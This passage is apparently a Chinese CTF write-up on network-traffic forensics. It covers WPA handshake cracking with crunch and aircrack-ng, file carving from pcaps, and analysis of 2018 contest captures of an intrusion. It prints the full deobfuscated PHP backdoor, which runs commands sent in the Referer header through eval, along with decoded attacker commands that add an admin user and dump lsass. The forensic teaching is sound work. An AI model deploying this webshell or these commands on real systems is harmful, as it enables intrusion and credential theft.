+<p><img src="https://img.jwt1399.top//img/20201230114537.png"><br><img src="https://img.jwt1399.top//img/20201230114551.png"></p>
+<p><img src="https://img.jwt1399.top//img/20201230114605.png"></p>
+<p>依次查看所有icmp包拼凑字符得到flag<br><code>flag&#123;Icmp_backdoor_can_transfer-some_infomation&#125;</code></p>
+<h4 id="题目：手机热点-蓝牙传输协议obex-数据提取"><a href="#题目：手机热点-蓝牙传输协议obex-数据提取" class="headerlink" title="题目：手机热点(蓝牙传输协议obex,数据提取)"></a>题目：手机热点(蓝牙传输协议obex,数据提取)</h4><p>题目来源：第七季极客大挑战<br>考点：蓝牙传输协议obex,数据提取<br>题目信息：(Blatand_1.pcapng)<br><img src="https://img.jwt1399.top//img/20201230114648.png"><br>根据题目提示，手机共享，那么应该是蓝牙传输，蓝牙传输协议为<strong>OBEX</strong>，过滤后发现含有一个压缩包<br><img src="https://img.jwt1399.top//img/20201230114717.png"><br><strong>方法一</strong>：foremost分离后得到压缩包，解压得到flag.gif<br><img src="https://img.jwt1399.top//img/20201230114729.png" alt="img"><br><strong>方法二</strong>：选中含secret.rar包，进行如下操作<br><img src="https://img.jwt1399.top//img/20201230114755.png" alt="img"><br>保存为1.rar，解压后得到flag.gif</p>
+<h4 id="题目：想蹭网先解开密码-无线密码破解"><a href="#题目：想蹭网先解开密码-无线密码破解" class="headerlink" title="题目：想蹭网先解开密码(无线密码破解)"></a>题目：想蹭网先解开密码(无线密码破解)</h4><p>题目来源：bugku<br>考点：无线密码破解<br>题目信息：(wifi.cap)<br><img src="https://img.jwt1399.top//img/20201230114817.png"><br>下载cap包，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下<br><img src="https://img.jwt1399.top//img/20201230114836.png"><br>果然存在四次握手包，直接进行无线密码爆破<br>创建密码字典：</p>
+<pre><code>crunch 11 11 -t 1391040%%%% &gt;&gt; wifipass.txt
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230114850.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a3401b0f3d9a">Linux下的字典生成工具Crunch</a><br>利用aircrack-ng 进行爆破</p>
+<pre><code>aircrack-ng -w wifipass.txt wifi.cap
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230114940.png"><br>得到flag<br><code>flag&#123;13910407686&#125;</code></p>
+<h3 id="进阶题型"><a href="#进阶题型" class="headerlink" title="进阶题型"></a>进阶题型</h3><h4 id="题目：抓到一只苍蝇-数据包筛选-数据提取"><a href="#题目：抓到一只苍蝇-数据包筛选-数据提取" class="headerlink" title="题目：抓到一只苍蝇(数据包筛选,数据提取)"></a>题目：抓到一只苍蝇(数据包筛选,数据提取)</h4><p>题目来源：bugku<br>考点：数据包筛选,数据提取<br>题目信息：(misc_fly.pcapng)<br><img src="https://img.jwt1399.top//img/20201230114957.png"><br>首先打开数据包，题目提示了抓到一只苍蝇，试一试搜索苍蝇</p>
+<pre class="line-numbers language-php"><code class="language-php">http contains <span class="token string">"苍蝇"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现一些可疑信息，仔细分析一下发现是在发qq邮件，并且还上传了文件</p>
+<p><img src="https://img.jwt1399.top//img/20201230115027.png"><br>既然上传了文件，我们再过滤POST请求试试:</p>
+<pre class="line-numbers language-html"><code class="language-html">http.request.method==POST
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到13号数据包调用函数<code>CreateFile</code>，然后下面几个可能就是文件内容了，具体是几个，仔细看看URL，738号数据包有个需要调用函数<code>CheckFile</code>，并且前面的5个数据包url的路径一样，<br>所以从第一个开始，后5个数据包是flag.rar内容<br><img src="https://img.jwt1399.top//img/20201230115058.png"><br>我们将分组字节流中的原始数据分别保存为1、2、3、4、5，方便操作<br><img src="https://img.jwt1399.top//img/20201230115114.png"><br><img src="https://img.jwt1399.top//img/20201230115126.png"><br>但是由于TCP包有文件头，我们需要去掉文件头才能将原始数据合成一个文件，<br>从第一个数据包可以看出来：</p>
+<p><img src="https://img.jwt1399.top//img/20201230115138.png"><br>文件大小是525701字节，我们需要的这5个数据包的大小(Media Type中可看到):</p>
+<blockquote>
+<p>131436*4+1777=527521<br>527521-525701=1820<br>1820/5=364</p>
+</blockquote>
+<p>tcp包的文件头就为364</p>
+<p>然后使用linux的一些工具进行操作即可得到flag.rar<br>依次把五个文件去掉文件头保存到另一文件<br>这里使用dd：</p>
+<pre class="line-numbers language-php"><code class="language-php">dd <span class="token keyword">if</span><span class="token operator">=</span><span class="token number">1</span> bs<span class="token operator">=</span><span class="token number">1</span> skip<span class="token operator">=</span><span class="token number">364</span> of<span class="token operator">=</span><span class="token number">1.1</span>
+
+dd命令语法：
+<span class="token keyword">if</span> 输入文件名
+bs 设置每次读写块的大小为<span class="token number">1</span>字节 
+skip 指定从输入文件开头跳过多少个块后再开始复制
+of 输出文件名
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230115153.png"><br>然后再用linux的输入流来合并成一个文件：</p>
+<pre class="line-numbers language-php"><code class="language-php">cat <span class="token number">1.1</span> <span class="token number">2.1</span> <span class="token number">3.1</span> <span class="token number">4.1</span> <span class="token number">5.1</span> <span class="token operator">></span> fly<span class="token punctuation">.</span>rar
+或者
+copy <span class="token operator">/</span>B <span class="token number">1.1</span><span class="token operator">+</span><span class="token number">2.1</span><span class="token operator">+</span><span class="token number">3.1</span><span class="token operator">+</span><span class="token number">4.1</span><span class="token operator">+</span><span class="token number">5.1</span> fly<span class="token punctuation">.</span>rar
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230115208.png"><br>然后fly.rar又被伪加密了，所以需要将这个文件用HXD打开后，将其中的74 84改为74 80就能打开了<br><img src="https://img.jwt1399.top//img/20201230115219.png"><br>解压得到flag.txt，用HXD打开，显示在win32下运行，<br><img src="https://img.jwt1399.top//img/20201230115233.png"><br>因此改为exe可执行文件后，一堆苍蝇出现了。。。。<br>binwalk一下发现含有很多图片,foremost提取一下，得到一个二维码<br><img src="https://img.jwt1399.top//img/20201230115246.png"><br>扫码得到flag<br><img src="https://img.jwt1399.top//img/20201230115302.png"></p>
+<h3 id="数据分析题"><a href="#数据分析题" class="headerlink" title="数据分析题"></a>数据分析题</h3><blockquote>
+<p>题目一,二,三,四<br>题目给了10个流量包，其中只有四个流量包能够分析出有用信息<br>为了方便，分为题目一二三四对四个流量包进行了分析</p>
+</blockquote>
+<p>题目详情：<br><img src="https://img.jwt1399.top//img/20201230115317.jpg"></p>
+<h4 id="题目一-1-pcap"><a href="#题目一-1-pcap" class="headerlink" title="题目一(1.pcap)"></a>题目一(1.pcap)</h4><p>题目来源：2018信息安全铁人三项数据赛</p>
+<blockquote>
+<p>题目要求：<br>1.黑客攻击的第一个受害主机的网卡IP地址<br>2.黑客对URL的哪一个参数实施了SQL注入<br>3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）<br>4.第一个受害主机网站数据库的名字</p>
+</blockquote>
+<p>打开流量包，流量包有点大，打开比较慢，这里我们先过滤为HTTP协议可以看到<code>202.1.1.2</code>对<code>192.168.1.8</code>进行了疯狂的爆破<br><img src="https://img.jwt1399.top//img/20201230115337.png"><br>不难看出，黑客利用的SqlMap在对目标站点进行不断的SQL试探注入<br>因此受害主机的网卡IP地址为**<code>192.168.1.8 </code>**<br>而注入的参数也可以清晰的看见，为**<code>list[select]</code>**<br><img src="https://img.jwt1399.top//img/20201230115349.png"><br>追踪http流，根据回显内容，目标站点数据库抛出的错误，可以清晰的看见<br><img src="https://img.jwt1399.top//img/20201230115404.png"><br>不难确定，目标站点的数据库表名前缀为**<code>ajtuc_</code>**<br>接着为了确定受害主机网站数据库的名字，再进行了一次过滤</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http
+</code></pre>
+<p>此时挑选最后一次注入的payload进行url解码<br><img src="https://img.jwt1399.top//img/20201230115419.png"><br>可以清楚的看到</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">FROM</span> joomla<span class="token punctuation">.</span>ajtuc_users
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>因此数据库名为**<code>joomla</code>**</p>
+<h5 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h5><pre><code>1.黑客攻击的第一个受害主机的网卡IP地址 
+192.168.1.8
+2.黑客对URL的哪一个参数实施了SQL注入
+list[select]
+3.第一个受害主机网站数据库的表前缀(加上下划线例如abc_)
+ajtuc_
+4.第一个受害主机网站数据库的名字
+joomla
+</code></pre>
+<h4 id="题目二-2-pcap"><a href="#题目二-2-pcap" class="headerlink" title="题目二(2.pcap)"></a>题目二(2.pcap)</h4><p>题目来源：2018信息安全铁人三项数据赛</p>
+<blockquote>
+<p>题目要求：<br>1.黑客第一次获得的php木马的密码是什么<br>2.黑客第二次上传php木马是什么时间<br>3.第二次上传的木马通过HTTP协议中的哪个头传递数据</p>
+</blockquote>
+<p>根据题目一已确定目标ip，所以依旧使用以下过滤简化操作</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http
+</code></pre>
+<p>可以看到一个奇怪文件<code>kkkaaa.php</code>,跟进POST数据查看<br><img src="https://img.jwt1399.top//img/20201230115437.png"><br>不难发现，是中国菜刀的流量,木马密码为**<code>zzz</code>**<br>接着确定黑客第二次上传php木马的时间<br>我进行了过滤，猜想黑客应该是根据第一个木马来上传的第二个木马</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST
+</code></pre>
+<p>此时一条数据格外引人注目<br><img src="https://img.jwt1399.top//img/20201230115452.png"><br>我们对其16进制进行分析<br><img src="https://img.jwt1399.top//img/20201230115505.png"><br>将保存的值放入HXD中得到源码<br><img src="https://img.jwt1399.top//img/20201230115518.png"><br>将文件保存为php,但是代码经过混淆过的，在代码末尾加上下面两句代码</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>运行php进行解混淆，发现这就是木马<br><img src="https://img.jwt1399.top//img/20201230115533.png"><br>由此可确定这个引人注目的包上传了第二个木马<br>因此上传时间为:<code>17:20:44.248365</code><br>美化后</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$kh</span> <span class="token operator">=</span> <span class="token string">"cb42"</span><span class="token punctuation">;</span>
+<span class="token variable">$kf</span> <span class="token operator">=</span> <span class="token string">"e130"</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token variable">$k</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$l</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$l</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$l</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$o</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span> <span class="token operator">^</span> <span class="token variable">$k</span><span class="token punctuation">{</span><span class="token variable">$j</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token variable">$o</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">;</span>
+<span class="token variable">$rr</span> <span class="token operator">=</span> @<span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"HTTP_REFERER"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$ra</span> <span class="token operator">=</span> @<span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"HTTP_ACCEPT_LANGUAGE"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rr</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ra</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$rr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">[</span><span class="token string">"query"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$q</span> <span class="token operator">=</span> <span class="token function">array_values</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span><span class="token punctuation">,</span> <span class="token variable">$ra</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        @<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$s</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">;</span>
+        <span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token string">"substr"</span><span class="token punctuation">;</span>
+        <span class="token variable">$sl</span> <span class="token operator">=</span> <span class="token string">"strtolower"</span><span class="token punctuation">;</span>
+        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$h</span> <span class="token operator">=</span> <span class="token variable">$sl</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token variable">$kh</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$sl</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token variable">$kf</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$z</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$z</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$p</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$q</span><span class="token punctuation">[</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$z</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$h</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+            <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$ss</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
+            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token variable">$kh</span> <span class="token punctuation">.</span> <span class="token variable">$kf</span><span class="token punctuation">;</span>
+                <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                @<span class="token function">eval</span><span class="token punctuation">(</span>@<span class="token function">gzuncompress</span><span class="token punctuation">(</span>@<span class="token function">x</span><span class="token punctuation">(</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"/_/"</span><span class="token punctuation">,</span> <span class="token string">"/-/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$ss</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;$k>$d&lt;/$k>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                @<span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>容易看到此时有两个与HTTP头有关的参数</p>
+<pre><code>$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];
+$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];
+</code></pre>
+<p>还是使用过滤</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http
+</code></pre>
+<p>然后可以看到许多请求footer.php的页面，点开一个查看详情<br><img src="https://img.jwt1399.top//img/20201230115556.png"><br>容易发现referer数据十分可疑，而ACCEPT_LANGUAGE较为正常<br>所以可以基本确定，木马通过HTTP协议中的**<code>Referer</code>**头传递数据</p>
+<h5 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h5><pre><code>1.黑客第一次获得的php木马的密码是什么
+zzz
+2.黑客第二次上传php木马是什么时间
+17:20:44.248365
+3.第二次上传的木马通过HTTP协议中的哪个头传递数据
+Referer
+</code></pre>
+<h4 id="题目三-3-pcap"><a href="#题目三-3-pcap" class="headerlink" title="题目三(3.pcap)"></a>题目三(3.pcap)</h4><p>题目来源：2018信息安全铁人三项数据赛</p>
+<blockquote>
+<p>题目要求：<br>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>2.php代理第一次被使用时最先连接了哪个IP地址</p>
+</blockquote>
+<p>直接进行过滤</p>
+<pre><code>tcp contains &quot;mysql&quot; &amp;&amp; mysql
+</code></pre>
+<p>得到大量数据，可以发现黑客应该在对Mysql的登录进行爆破，内网受害机器为192.168.2.20<br><img src="https://img.jwt1399.top//img/20201230115614.png"><br>我们找到最后一条登录数据<br><img src="https://img.jwt1399.top//img/20201230115627.png"><br>该值就为我们需要的mysql密码hash了<br>简单过滤一下</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230115643.png"><br>目标机器已经被挂上了tunnel.php，方便外网对内网的访问<br>为方便查看黑客操作，我们过滤出POST请求</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST &amp;&amp; http
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230115656.png"><br>我们清晰的看见黑客的php代理第一次使用时最先连接4.2.2.2这个ip</p>
+<h5 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h5><pre><code>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)
+admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4
+2.php代理第一次被使用时最先连接了哪个IP地址
+4.2.2.2
+</code></pre>
+<h4 id="题目四-4-pcap"><a href="#题目四-4-pcap" class="headerlink" title="题目四(4.pcap)"></a>题目四(4.pcap)</h4><p>题目来源：2018信息安全铁人三项数据赛</p>
+<blockquote>
+<p>题目要求：<br>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>2.黑客在内网主机中添加的用户名和密码是多少<br>3.黑客从内网服务器中下载下来的文件名</p>
+</blockquote>
+<p>为确定黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候，我们继续进行过滤</p>
+<pre><code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; (http contains &quot;dir&quot; || http contains &quot;ls&quot;)
+</code></pre>
+<p><img src="https://img.jwt1399.top//img/20201230115712.png"><br>此时一条为ls，一条为dir，我们先对ls的进行验证<br>追踪其tcp流<br><img src="https://img.jwt1399.top//img/20201230115738.png"><br>发现并没有执行成功,再对dir进行验证<br><img src="https://img.jwt1399.top//img/20201230115752.png"><br>于是可以确定无误，目标系统为windows，同时dir命令执行成功<br>时间为：<code>18:37:38.482420</code><br>既然该192.168.2.20的机器可以执行命令，于是我改变过滤方式，查看黑客如何进行攻击</p>
+<pre><code>ip.addr == 192.168.2.20 &amp;&amp; http
+</code></pre>
+<p>不难发现,黑客利用echo命令写入了一个名为sh.php的后门<br><img src="https://img.jwt1399.top//img/20201230115807.png"><br><img src="https://img.jwt1399.top//img/20201230115815.png"><br>我们进一步跟进黑客执行的指令，由于是中国菜刀流量，我们选择根据回显明文，猜测指令，这样更有效率</p>
+<pre><code>ip.src == 192.168.2.20 &amp;&amp; http
+</code></pre>
+<p>在18:50:09.344660时，我们发现可疑操作,我们发现一条可疑数据，判断黑客应该是执行了<code>net user</code>的命令</p>
+<p><img src="https://img.jwt1399.top//img/20201230115829.png"></p>
+<p>然后在18:50:42.908737发现黑客再次执行了net user命令<br>此时回显为：<br><img src="https://img.jwt1399.top//img/20201230115842.png"><br>看来黑客成功添加了管理员用户kaka<br>确定了大致的作案时间，我们即可使用过滤</p>
+<pre><code>ip.addr == 192.168.2.20 &amp;&amp; http
+</code></pre>
+<p>根据之前的判断，我们可以知道<br>18:49:27.767754时，不存在kaka用户<br>18:50:42.908737时，kaka用户已成为管理员<br>所以可以断定作案时间点在这段时间内<br><img src="https://img.jwt1399.top//img/20201230115857.png"><br>在此期间，一共4个POST请求，我们挨个查看，果不其然，在第一个POST中就发现了问题</p>
+<pre><code>Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIg
+a2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=
+</code></pre>
+<p>解码后</p>
+<pre><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]
+</code></pre>
+<p>可以明显看到</p>
+<pre><code>net user kaka kaka /add
+</code></pre>
+<p>于是可以断定，用户名和密码均为<code>kaka</code><br>最后一题既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p>
+<pre><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST
+</code></pre>
+<p>然后我们在数据包的最后发现如下数据<br><img src="https://img.jwt1399.top//img/20201230115917.png"><br>我们将其解码<br><img src="https://img.jwt1399.top//img/20201230115924.png"><br>发现使用了procdump.exe<br>同时发现文件<br><img src="https://img.jwt1399.top//img/20201230115938.png"><br>解码得到<br><img src="https://img.jwt1399.top//img/20201230115950.png"><br>最后我们可以确定，黑客下载了<code>lsass.exe_180208_185247.dmp</code>文件</p>
+<h5 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h5><pre><code>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候
+18:37:38.482420
+2.黑客在内网主机中添加的用户名和密码是多少
+kaka:kaka
+3.黑客从内网服务器中下载下来的文件名
+lsass.exe_180208_185247.dmp
+</code></pre>
